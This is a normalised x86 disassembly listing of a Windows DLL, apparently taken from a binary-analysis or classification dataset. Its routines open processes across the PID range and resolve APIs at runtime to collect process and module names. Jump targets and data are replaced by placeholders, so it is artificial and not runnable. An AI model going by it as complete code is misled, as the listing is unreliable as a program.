mov edi [ ebp - 0x9b8 ]
lea ecx [ ebp - 0x87c ]
mov [ ebp - 0x858 ] edx
call sub_10003dc0
lea esi [ ebp - 0x87c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100036d0
mov ecx [ ebp - 0x9a8 ]
lea eax [ ebp - 0x9a4 ]
push eax
push ecx
call [ ebp - 0x9b4 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x9a8 ]
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x9b0 ]
push edx
call [ FreeLibrary@IAT ]
mov eax ebx
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
sub_100036d0
cmp [ esi + 0x5c ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x5c ] 0xf
mov [ esi + 0x58 ] ebx
mov [ esi + 0x48 ] bl
cmp [ esi + 0x3c ] 0x10
jb r-xdata
mov eax [ esi + 0x48 ]
push eax
call sub_10009140
add esp 0x4
mov [ esi + 0x3c ] 0xf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] bl
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov ecx [ esi + 0x28 ]
push ecx
call sub_10009140
add esp 0x4
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x8 ] bl
pop ebx
retn
mov edx [ esi + 0x8 ]
push edx
call sub_10009140
add esp 0x4
sub_10003740
push ebp
mov ebp esp
push 0xffffffff
push sub_10016725
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
xor esi esi
mov [ ebp - 0xc84 ] eax
mov [ ebp - 0xc80 ] esi
inc esi
mov [ ebp - 0xc80 ] esi
cmp esi 0xffff
jb r-xdata
push eax
call [ CloseHandle@IAT ]
lea ecx [ ebp - 0x414 ]
push 0x400
push ecx
lea edx [ ebp - 0xc14 ]
mov ecx esi
call sub_10002da0
lea edx [ ebp - 0x814 ]
mov ecx esi
call sub_10003100
push esi
call sub_100032e0
mov [ ebp - 0xc88 ] eax
mov eax 0xf
add esp 0xc
mov [ ebp - 0xc60 ] eax
mov [ ebp - 0xc64 ] ebx
mov [ ebp - 0xc74 ] bl
mov [ ebp - 0xc40 ] eax
mov [ ebp - 0xc44 ] ebx
mov [ ebp - 0xc54 ] bl
mov [ ebp - 0xc20 ] eax
mov [ ebp - 0xc24 ] ebx
mov [ ebp - 0xc34 ] bl
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x414 ]
mov [ ebp - 0xc7c ] esi
mov [ ebp - 0xc78 ] ebx
lea edx [ eax + 0x1 ]
push 0x3ff
lea ecx [ ebp - 0x413 ]
push ebx
push ecx
mov [ ebp - 0x414 ] bl
call sub_1000ffa0
add esp 0xc
push 0x3ff
lea edx [ ebp - 0xc13 ]
push ebx
push edx
mov [ ebp - 0xc14 ] bl
call sub_1000ffa0
add esp 0xc
push 0x3ff
lea eax [ ebp - 0x813 ]
push ebx
push eax
mov [ ebp - 0x814 ] bl
call sub_1000ffa0
add esp 0xc
push esi
push ebx
push 0x400
call [ OpenProcess@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0xc74 ]
call sub_10003ed0
lea eax [ ebp - 0xc14 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0xc14 ]
lea esi [ ebp - 0xc34 ]
call sub_10003ed0
lea eax [ ebp - 0x814 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x814 ]
lea esi [ ebp - 0xc54 ]
call sub_10003ed0
mov edi [ ebp - 0xc84 ]
mov ecx [ edi + 0x4 ]
mov edx [ ebp - 0xc88 ]
lea eax [ ebp - 0xc7c ]
mov [ ebp - 0xc58 ] edx
cmp eax ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
lea edx [ ebp - 0xc7c ]
cmp eax edx
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] 0x2
cmp eax ebx
je r-xdata
mov ecx edi
call sub_10003e60
mov ecx edx
sub ecx eax
mov eax 0x51eb851f
imul ecx
mov eax [ edi + 0x4 ]
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x64
mov esi 0x10
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0xc20 ] esi
jb r-xdata
lea ecx [ ebp - 0xc7c ]
mov eax [ edi + 0x4 ]
imul esi esi 0x64
add esi [ edi ]
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov ecx edi
call sub_10003e60
mov edi 0xf
mov [ ebp - 0xc20 ] edi
mov [ ebp - 0xc24 ] ebx
mov [ ebp - 0xc34 ] bl
cmp [ ebp - 0xc40 ] esi
jb r-xdata
mov eax [ ebp - 0xc34 ]
push eax
call sub_10009140
add esp 0x4
mov ecx esi
jmp r-xdata
mov [ ebp - 0xc40 ] edi
mov [ ebp - 0xc44 ] ebx
mov [ ebp - 0xc54 ] bl
cmp [ ebp - 0xc60 ] esi
jb r-xdata
mov ecx [ ebp - 0xc54 ]
push ecx
call sub_10009140
add esp 0x4
push eax
call sub_100044a0
mov esi [ ebp - 0xc80 ]
mov edx [ ebp - 0xc74 ]
push edx
call sub_10009140
add esp 0x4
sub_10003a20
push ebp
mov ebp esp
push 0xffffffff
push sub_100166db
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1c98
call sub_10013210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
push 0xffc
lea ecx [ ebp - 0x1c10 ]
push ebx
push ecx
mov [ ebp - 0x1c94 ] eax
mov edi 0x6
mov [ ebp - 0x1c14 ] ebx
call sub_1000ffa0
add esp 0xc
push r--data
mov [ ebp - 0x1c88 ] ebx
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ ebp - 0x1c98 ] esi
cmp esi ebx
je r-xdata
mov eax edi
jmp r-xdata
mov edi [ GetProcAddress@IAT ]
push r--data
push esi
call edi
push r--data
push esi
mov [ ebp - 0x1c80 ] eax
call edi
push r--data
push esi
mov [ ebp - 0x1c8c ] eax
call edi
mov ecx eax
mov eax [ ebp - 0x1c80 ]
mov [ ebp - 0x1ca0 ] ecx
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10008d64
mov esp ebp
pop ebp
retn
mov eax 0x6
cmp [ ebp - 0x1c8c ] ebx
je r-xdata
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x1c88 ]
push edx
push 0x1000
lea ecx [ ebp - 0x1c14 ]
push ecx
call eax
test eax eax
je r-xdata
test [ ebp - 0x1c88 ] 0xfffffffc
mov [ ebp - 0x1c84 ] ebx
jbe r-xdata
push esi
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
push 0x3ff
lea edx [ ebp - 0xc13 ]
push ebx
push edx
mov [ ebp - 0x1c80 ] ebx
mov [ ebp - 0xc14 ] bl
call sub_1000ffa0
add esp 0xc
push 0x3ff
lea eax [ ebp - 0x413 ]
push ebx
push eax
mov [ ebp - 0x414 ] bl
call sub_1000ffa0
add esp 0xc
push 0x3ff
lea ecx [ ebp - 0x813 ]
push ebx
push ecx
mov [ ebp - 0x814 ] bl
call sub_1000ffa0
mov edi [ ebp - 0x1c84 ]
mov edx [ ebp + edi * 4 - 0x1c14 ]
add esp 0xc
lea edi [ ebp + edi * 4 - 0x1c14 ]
push edx
push ebx
push 0x410
mov [ ebp - 0x1c9c ] ebx
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov ecx [ edi ]
push ebx
push ebx
lea edx [ ebp - 0x414 ]
call sub_10002da0
mov ecx [ edi ]
lea edx [ ebp - 0x814 ]
call sub_10003100
mov ecx [ edi ]
push ecx
call sub_100032e0
mov [ ebp - 0x1c90 ] eax
mov eax 0xf
add esp 0xc
mov [ ebp - 0x1c60 ] eax
mov [ ebp - 0x1c64 ] ebx
mov [ ebp - 0x1c74 ] bl
mov [ ebp - 0x1c40 ] eax
mov [ ebp - 0x1c44 ] ebx
mov [ ebp - 0x1c54 ] bl
mov [ ebp - 0x1c20 ] eax
mov [ ebp - 0x1c24 ] ebx
mov [ ebp - 0x1c34 ] bl
mov [ ebp - 0x4 ] ebx
mov edx [ edi ]
lea eax [ ebp - 0x414 ]
mov [ ebp - 0x1c7c ] edx
mov [ ebp - 0x1c78 ] ebx
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x1c9c ]
push eax
push 0x4
lea ecx [ ebp - 0x1c80 ]
push ecx
push esi
call [ ebp - 0x1c8c ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x1c74 ]
call sub_10003ed0
lea eax [ ebp - 0x414 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x1c80 ]
push 0x400
lea edx [ ebp - 0xc14 ]
push edx
push eax
push esi
call [ ebp - 0x1ca0 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x1c34 ]
call sub_10003ed0
lea eax [ ebp - 0x814 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ ebp - 0x814 ]
lea esi [ ebp - 0x1c54 ]
call sub_10003ed0
mov eax [ ebp - 0x1c90 ]
mov edi [ ebp - 0x1c94 ]
lea ecx [ ebp - 0x1c7c ]
mov [ ebp - 0x1c58 ] eax
call sub_10003dc0
lea esi [ ebp - 0x1c7c ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100036d0
mov eax [ ebp - 0x1c84 ]
mov ecx [ ebp - 0x1c88 ]
inc eax
shr ecx 0x2
mov [ ebp - 0x1c84 ] eax
cmp eax ecx
jb r-xdata
mov esi [ ebp - 0x1c98 ]
sub_10003d90
push ebp
mov ebp esp
push esi
mov ecx eax
push edi
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
mov esi [ ebp + 0x8 ]
mov edi ecx
call sub_10003ed0
pop edi
pop esi
pop ebp
retn 0x4
sub_10003dc0
push ebp
mov ebp esp
push 0xffffffff
push sub_100166aa
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov eax [ edi + 0x4 ]
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov ecx edi
call sub_10003e60
sub esi eax
mov eax 0x51eb851f
imul esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x64
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
mov eax [ edi + 0x4 ]
imul esi esi 0x64
add esi [ edi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx edi
call sub_10003e60
jmp r-xdata
push eax
call sub_100044a0
sub_10003e60
mov edx [ ecx + 0x4 ]
push esi
push edi
mov edi [ ecx ]
sub edx edi
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp esi 0x28f5c27
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx edi
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_10008ca9
pop edi
pop esi
retn
mov edx eax
shr edx 0x1
mov edi 0x28f5c28
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10003fa0
mov eax esi
cmp eax esi
jae r-xdata
sub_10003ed0
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10008ca9
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
push esi
call sub_10004240
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
mov eax esi
pop ebx
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax ] 0x0
pop ebx
retn
mov eax [ esi ]
mov [ eax ] 0x0
mov eax esi
pop ebx
retn
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
mov eax esi
pop ebx
retn
push edi
push ebx
push eax
call sub_10010170
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
sub ebx eax
push esi
mov eax edi
mov ecx esi
call sub_100040a0
pop ebx
retn
mov eax [ esi ]
sub ebx eax
push esi
mov eax edi
mov ecx esi
call sub_100040a0
pop ebx
retn
sub_10003fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_10016680
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x28f5c28
jbe r-xdata
mov edx [ esi + 0x8 ]
sub edx [ esi ]
mov eax 0x51eb851f
imul edx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ecx
jae r-xdata
push r--data
call sub_10008ca9
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_10004180
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10004560
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x51eb851f
imul ecx
sar edx 0x5
mov edi edx
shr edi 0x1f
add esp 0xc
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
imul edi edi 0x64
mov ecx [ ebp - 0x14 ]
imul eax eax 0x64
add eax ecx
add edi ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] edi
mov [ esi ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
push ecx
push eax
mov eax ebx
call sub_10004420
mov edx [ esi ]
push edx
call sub_10009140
add esp 0xc
sub_100040a0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10008cf6
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
lea ecx [ edi + ebx ]
or eax 0xffffffff
call sub_100041d0
mov eax ebx
xor ecx ecx
call sub_100041d0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10008ca9
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
push esi
call sub_10004240
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
push edi
add ecx ebx
push ecx
push eax
call sub_10010170
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10004180
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x28f5c28
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_100098a4
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10009ea4
imul ecx ecx 0x64
push ecx
call sub_1000919c
add esp 0x4
test eax eax
jne r-xdata
sub_100041d0
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10008cf6
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
mov eax esi
pop edi
retn
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_100092b0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10004240
push ebp
mov ebp esp
push 0xffffffff
push sub_10016590
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x0
call sub_100098a4
push r--data
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] r--data
call sub_10009ea4
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] 0x2
call sub_100043b0
mov [ ebp + 0xc ] eax
mov eax r-xdata
retn
push ecx
call sub_1000919c
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_10009140
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi eax
push ebx
push eax
mov eax [ ebp + 0xc ]
push eax
call sub_10010170
add esp 0xc
sub_10004374
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_10009ea4
int3
mov edx [ esi ]
push edx
call sub_10009140
add esp 0x4
sub_100043b0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_100098a4
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_10009ea4
push ecx
call sub_1000919c
add esp 0x4
test eax eax
jne r-xdata
sub_10004420
push ebp
mov ebp esp
cmp eax [ ebp + 0x8 ]
je r-xdata
pop ebp
retn
push ebx
push esi
push edi
lea esi [ eax + 0x5c ]
mov edi 0xf
xor ebx ebx
mov [ esi ] edi
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x20 ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_10009140
add esp 0x4
mov [ esi - 0x20 ] edi
mov [ esi - 0x24 ] ebx
mov [ esi - 0x34 ] bl
cmp [ esi - 0x40 ] 0x10
jb r-xdata
mov ecx [ esi - 0x34 ]
push ecx
call sub_10009140
add esp 0x4
mov [ esi - 0x40 ] edi
mov [ esi - 0x44 ] ebx
mov [ esi - 0x54 ] bl
add esi 0x64
lea eax [ esi - 0x5c ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov edx [ esi - 0x54 ]
push edx
call sub_10009140
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
pop edi
pop esi
pop ebx
sub_100044a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100165f6
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ esi ] eax
mov ecx [ edi + 0x4 ]
mov [ esi + 0x4 ] ecx
lea ecx [ esi + 0x8 ]
lea edx [ edi + 0x8 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
or eax 0xffffffff
xor ebx ebx
mov [ ecx ] 0x0
call sub_100040a0
xor eax eax
mov [ ebp - 0x4 ] eax
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
lea ecx [ esi + 0x28 ]
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
lea edx [ edi + 0x28 ]
mov [ ecx ] al
push edx
or eax 0xffffffff
call sub_100040a0
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x44 ]
mov [ esi + 0x44 ] eax
lea ecx [ esi + 0x48 ]
add edi 0x48
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edi
or eax 0xffffffff
mov [ ecx ] bl
call sub_100040a0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10004560
push ebp
mov ebp esp
push 0xffffffff
push sub_1001665b
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor eax eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi eax
je r-xdata
add esi 0x64
mov [ ebp - 0x4 ] al
mov [ ebp + 0xc ] esi
add edi 0x64
jmp r-xdata
mov ecx [ edi ]
mov [ esi ] ecx
mov edx [ edi + 0x4 ]
lea ecx [ esi + 0x8 ]
mov [ esi + 0x4 ] edx
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] 0xf
mov [ ecx ] al
lea eax [ edi + 0x8 ]
push eax
or eax 0xffffffff
xor ebx ebx
call sub_100040a0
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
lea ecx [ esi + 0x28 ]
lea edx [ edi + 0x28 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
or eax 0xffffffff
mov [ ecx ] bl
call sub_100040a0
mov [ ebp - 0x4 ] 0x3
mov eax [ edi + 0x44 ]
mov [ esi + 0x44 ] eax
lea ecx [ esi + 0x48 ]
lea edx [ edi + 0x48 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
or eax 0xffffffff
mov [ ecx ] bl
call sub_100040a0
xor eax eax
sub_10004638
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_10009ea4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10004670
add esi 0x64
cmp esi edi
jne r-xdata
sub_10004670
cmp [ esi + 0x5c ] 0x10
jb r-xdata
push ebx
xor ebx ebx
mov [ esi + 0x5c ] 0xf
mov [ esi + 0x58 ] ebx
mov [ esi + 0x48 ] bl
cmp [ esi + 0x3c ] 0x10
jb r-xdata
mov eax [ esi + 0x48 ]
push eax
call sub_10009140
add esp 0x4
mov [ esi + 0x3c ] 0xf
mov [ esi + 0x38 ] ebx
mov [ esi + 0x28 ] bl
cmp [ esi + 0x1c ] 0x10
jb r-xdata
mov ecx [ esi + 0x28 ]
push ecx
call sub_10009140
add esp 0x4
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x8 ] bl
mov eax esi
pop ebx
retn
mov edx [ esi + 0x8 ]
push edx
call sub_10009140
add esp 0x4
sub_100046e0
push esi
mov esi eax
push edi
cmp esi 0x4
jb r-xdata
test esi esi
je r-xdata
lea esp [ esp ]
pop edi
xor eax eax
pop esi
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
retn
cmp esi 0x1
jbe r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_10004760
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_10009c0a
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
